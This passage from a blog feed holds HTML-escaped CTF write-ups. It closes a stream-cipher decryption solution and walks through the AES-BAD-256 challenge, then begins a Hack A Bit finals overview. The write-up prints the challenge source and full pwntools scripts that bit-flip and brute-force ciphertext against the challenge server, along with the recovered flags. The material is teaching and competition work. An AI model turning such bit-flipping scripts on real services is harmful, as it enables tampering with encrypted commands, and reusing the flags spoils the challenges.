&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(p1)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    plaintext &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(plaintext)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;decrypted.sqlite3&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(plaintext)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;./img/sqlflag.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;&lt;code&gt;irisctf{g0tt4_l0v3_s7re4mciph3rs}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;aes-bad-256---18-solves&#34;&gt;AES-BAD-256 - 18 solves&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;I heard that some common block cipher modes have lots of footguns - using none (ECB) results in the legendary &lt;a href=&#34;https://words.filippo.io/the-ecb-penguin/&#34;&gt;ECB Penguin&lt;/a&gt;, while others are vulnerable to &lt;a href=&#34;https://en.wikipedia.org/wiki/Bit-flipping_attack&#34;&gt;bit flipping&lt;/a&gt; and &lt;a href=&#34;https://en.wikipedia.org/wiki/Padding_oracle_attack&#34;&gt;padding&lt;/a&gt; attacks, so I made my own that would never fall to such a technique.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I&amp;rsquo;m going to admit - I cheesed this challenge quite hard with bruteforce, but in my defense it was 3am&amp;hellip;&lt;/p&gt;

  &lt;img src=&#34;./img/3amflag.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 50%;&#34;  /&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;5&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;5&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;chal.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-py&#34; &gt;&lt;code&gt;
from Crypto.Cipher import AES as AES_BLOCK
import secrets
import random

AES_BLOCK_SIZE = 16
MODE_BLOCK_SIZE = AES_BLOCK_SIZE * 16

KEY = secrets.token_bytes(AES_BLOCK_SIZE)
AES = AES_BLOCK.new(KEY, AES_BLOCK.MODE_ECB)

import random
random.seed(KEY)

PERMUTATION = list(range(AES_BLOCK_SIZE))
random.shuffle(PERMUTATION)

def encrypt(inp):
    inp = inp.ljust(MODE_BLOCK_SIZE, b&amp;#34;\x00&amp;#34;)
    
    assert len(inp) % MODE_BLOCK_SIZE == 0

    data = b&amp;#34;&amp;#34;
    for block in range(0, len(inp), MODE_BLOCK_SIZE):
        for i in range(AES_BLOCK_SIZE):
            data &amp;#43;= bytes(inp[block&amp;#43;j*AES_BLOCK_SIZE&amp;#43;PERMUTATION[i]] for j in range(MODE_BLOCK_SIZE // AES_BLOCK_SIZE))
    
    return AES.encrypt(data)

def decrypt(inp):
    assert len(inp) % MODE_BLOCK_SIZE == 0

    inp = AES.decrypt(inp)
    data = b&amp;#34;&amp;#34;
    for block in range(0, len(inp), MODE_BLOCK_SIZE):
        for j in range(MODE_BLOCK_SIZE // AES_BLOCK_SIZE):
            for i in range(AES_BLOCK_SIZE):
                data &amp;#43;= bytes([inp[block &amp;#43; PERMUTATION.index(i) * (MODE_BLOCK_SIZE // AES_BLOCK_SIZE) &amp;#43; j]])
  
    return data

import json

def make_echo(inp):
    data = json.dumps({&amp;#34;type&amp;#34;: &amp;#34;echo&amp;#34;, &amp;#34;msg&amp;#34;: inp}).encode(errors=&amp;#34;ignore&amp;#34;)
    assert len(data) &amp;lt; 2**32
    return len(data).to_bytes(length=2, byteorder=&amp;#34;little&amp;#34;) &amp;#43; data

def run_command(inp):
    inp = decrypt(inp)
    length = int.from_bytes(inp[:2], byteorder=&amp;#34;little&amp;#34;)
    if length &amp;#43; 2 &amp;gt;= len(inp):
        return &amp;#34;Invalid command&amp;#34;
    
    # Show me what you got
    command = inp[2:length&amp;#43;2].decode(&amp;#34;ascii&amp;#34;, errors=&amp;#34;replace&amp;#34;)
    try:
        command = json.loads(command, strict=False)
    except Exception as e:
        return &amp;#34;Invalid command&amp;#34;

    if &amp;#34;type&amp;#34; not in command:
        return &amp;#34;No command type&amp;#34;

    match command[&amp;#34;type&amp;#34;]:
        case &amp;#34;echo&amp;#34;:
            return command.get(&amp;#34;msg&amp;#34;, &amp;#34;Hello world!&amp;#34;)
        case &amp;#34;flag&amp;#34;:
            with open(&amp;#34;/flag&amp;#34;, &amp;#34;r&amp;#34;) as f:
                return f.read()
        case other:
            return f&amp;#34;Unknown command type {command[&amp;#39;type&amp;#39;]}...&amp;#34;

BANNER = &amp;#34;This is an echo service. This interface is protected by AES-BAD-256 technology.&amp;#34;

MENU = &amp;#34;&amp;#34;&amp;#34;
1. Get an echo command
2. Run a command
3. Exit
&amp;#34;&amp;#34;&amp;#34;

def main():
    print(BANNER)
    while True:
        print(MENU)
        command = input(&amp;#34;&amp;gt; &amp;#34;)
        match command:
            case &amp;#34;1&amp;#34;:
                print(&amp;#34;Give me some text.\n&amp;#34;)
                data = input(&amp;#34;&amp;gt; &amp;#34;)
                print(encrypt(make_echo(data)).hex())
            case &amp;#34;2&amp;#34;:
                print(&amp;#34;Give me a command.\n&amp;#34;)
                data = bytes.fromhex(input(&amp;#34;(hex) &amp;gt; &amp;#34;))
                print(run_command(data))
            case other:
                print(&amp;#34;Bye!&amp;#34;)
                exit(0)
                

if __name__ == &amp;#34;__main__&amp;#34;:
    main()
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Okay, I didn&amp;rsquo;t go through most the code but the important thing is that this is a modification of AES-ECB with random block orders.&lt;/p&gt;
&lt;p&gt;Connecting to remote and testing a bit, I tried flipping some bits:&lt;/p&gt;

  &lt;img src=&#34;./img/flipped.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 50%;&#34;  /&gt;


&lt;p&gt;and yep, it does indeed look vulnerable to bit-flipping attacks! Notice &lt;code&gt;echo&lt;/code&gt; -&amp;gt; &lt;code&gt;zcho&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The server generates us a ciphertext of command &lt;code&gt;echo&lt;/code&gt; with some data, and our goal is to flip bits to make the command &lt;code&gt;flag&lt;/code&gt;, which gives us the flag.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;match command[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;]:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    case &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;echo&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; command&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;msg&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Hello world!&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    case &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/flag&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    case other:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Unknown command type &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;command[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;type&amp;#39;&lt;/span&gt;]&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;...&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;What&amp;rsquo;s super useful is that if the command is not valid, it tells us what our command was! Essentially, we get feedback about what bit we flipped something to.&lt;/p&gt;
&lt;p&gt;Now, remember the modification - block orders are random, therefore we will script to flip bits from every block and observe the feedback to see if we flipped the right bits. Our goal is to figure out which blocks need to be flipped to change the &lt;code&gt;echo&lt;/code&gt; text.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; binascii &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; unhexlify, hexlify
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;runcmd&lt;/span&gt;(thehex):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(hexlify(thehex))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getecho&lt;/span&gt;(txt):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(txt)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(a)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; unhexlify(a)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flipbit&lt;/span&gt;(str, pos):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bytes([[a,a&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;][c&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;pos] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c, a &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; enumerate(str)])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;aes.chal.irisc.tf&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10100&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;validecho &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getecho(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hello&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;indexes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, len(validecho), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    dat &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; runcmd(flipbit(validecho, i))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Unknown command type&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; dat:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; dat[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; dat[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; dat[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;h&amp;#34;&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; dat[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;o&amp;#34;&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        indexes[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    indexes[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                indexes[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            indexes[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(indexes)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Some horrifying python code, but it does the job. Like I said, 3am and coding don&amp;rsquo;t mix well.&lt;/p&gt;
&lt;p&gt;Anyways, now that we have the indexes of blocks that when flipped, change a character of &lt;code&gt;echo&lt;/code&gt;, we now can either:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;read the source code properly to figure how to flip them into the text &lt;code&gt;flag&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;OR&amp;hellip; brute force flipping the bit into every byte possible to figure which ones will result in the text &lt;code&gt;flag&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;guess which one I chose&amp;hellip;&lt;/p&gt;
&lt;p&gt;So we have positions of bits that when flipped, change a character at a position. We can just:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;go through each position, e.g. the position that affects &lt;code&gt;e&lt;/code&gt; from &lt;code&gt;echo&lt;/code&gt;, and change that bit into something.&lt;/li&gt;
&lt;li&gt;observe the response - does the character &lt;code&gt;e&lt;/code&gt; get flipped into &lt;code&gt;f&lt;/code&gt; from &lt;code&gt;flag&lt;/code&gt;? if not, change the bit into something else.&lt;/li&gt;
&lt;li&gt;after doing so for all the bits, we should get the flag!&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Here&amp;rsquo;s the horrendous code that does this:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;6&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;6&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;sol.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-py&#34; &gt;&lt;code&gt;
from pwn import *
from binascii import unhexlify, hexlify

def runcmd(thehex):
    r.sendline(b&amp;#34;2&amp;#34;)
    r.recv()
    r.sendline(hexlify(thehex))
    return r.recv()

def getecho(txt):
    r.sendline(b&amp;#34;1&amp;#34;)
    r.recv()
    r.sendline(txt)
    a=r.recvline().strip()
    print(a)
    return unhexlify(a)

def flipbit(str, pos):
    return bytes([[a,a^0xff][c==pos] for c, a in enumerate(str)])

r = remote(&amp;#39;aes.chal.irisc.tf&amp;#39;, 10100)

r.recv()
r.recv()
validecho = getecho(&amp;#34;hello&amp;#34;)
r.recv()
indexes = [None,None,None,None]
for i in range(0, len(validecho), 16):
    dat = runcmd(flipbit(validecho, i))
    
    if b&amp;#34;Unknown command type&amp;#34; in dat:
        if dat[21] == ord(&amp;#34;e&amp;#34;):
            if dat[22] == ord(&amp;#34;c&amp;#34;):
                if dat[23] == ord(&amp;#34;h&amp;#34;):
                    if dat[24] == ord(&amp;#34;o&amp;#34;):
                        pass
                    else:
                        indexes[3] = i
                else:
                    indexes[2] = i
            else:
                indexes[1] = i
        else:
            indexes[0] = i

finalecho = list(validecho)

for count, flagchar in enumerate(b&amp;#34;flag&amp;#34;):
    foundit = False
    for second in range(0, 256):
        for test in range(0, 256):
            testecho = list(validecho)
            testecho[indexes[count]] = test
            testecho[indexes[count]] ^=second
            testecho = bytes(testecho)
            dat = runcmd(testecho)
            print(dat)
            print(dat[21&amp;#43;count:22&amp;#43;count], count, flagchar)
            if dat[21&amp;#43;count:22&amp;#43;count] == bytes([flagchar]) and b&amp;#34;Unknown command type&amp;#34; in dat:
                print(&amp;#34;FOUND!!!&amp;#34;, test, dat, testecho.hex()) # good dopamine
                finalecho[indexes[count]] = test
                foundit = True
                break
        if foundit:
            break

dat = runcmd(bytes(finalecho))
print(dat)
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;The great thing is there is a &lt;em&gt;slight&lt;/em&gt; chance that the bit it&amp;rsquo;s choosing to flip never matches the character needed, so this was like gambling until 4 of them matched. But that&amp;rsquo;s what you get for brute forcing.&lt;/p&gt;

  &lt;img src=&#34;./img/amazingflag.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;As you can see, after brute forcing for the final &lt;code&gt;g&lt;/code&gt; of &lt;code&gt;flag&lt;/code&gt;, the full flipped ciphertext was sent and we got the flag!!!&lt;/p&gt;
&lt;p&gt;&lt;code&gt;irisctf{bad_at_diffusion_mode}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;I enjoyed these crypto challenges as they weren&amp;rsquo;t math oriented, although they were on the easy side, they were still fun and enjoyable to solve! Kudos to the challenge authors &lt;code&gt;sera&lt;/code&gt; and &lt;code&gt;lambda&lt;/code&gt; for making these!&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Full Writeups - Hack A Bit CTF Finals 0x01</title>
      <link>https://TheSavageTeddy.github.io/posts/writeups-hackabit2023finals/</link>
      <pubDate>Sun, 21 May 2023 00:00:00 +0800</pubDate>
      
      <guid>https://TheSavageTeddy.github.io/posts/writeups-hackabit2023finals/</guid>
      <description>Overview Hack a Bit is a competition for highschoolers with the aim to promote cybersecurity. This round was the finals and I managed to place 2nd overall!
Below are writeups for all the challenges in the finals. If I&amp;rsquo;ve missed anything or made a mistake like a typo, please let me know on discord TheSavageTeddy#7458. Enjoy!
Challenge Categories dvGPT (Web Exploitation) - 4 challenges
Corruption (Rev/Binary Exploitation) - 4 challenges</description>
      <content>&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://www.hackabit.com/&#34;&gt;Hack a Bit&lt;/a&gt; is a competition for highschoolers with the aim to promote cybersecurity. This round was the finals and I managed to place &lt;code&gt;2nd&lt;/code&gt; overall!&lt;/p&gt;

  &lt;img src=&#34;./img/scoreboard.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;Below are writeups for all the challenges in the finals. If I&amp;rsquo;ve missed anything or made a mistake like a typo, please let me know on discord &lt;code&gt;TheSavageTeddy#7458&lt;/code&gt;. Enjoy!&lt;/p&gt;
&lt;h1 id=&#34;challenge-categories&#34;&gt;Challenge Categories&lt;/h1&gt;
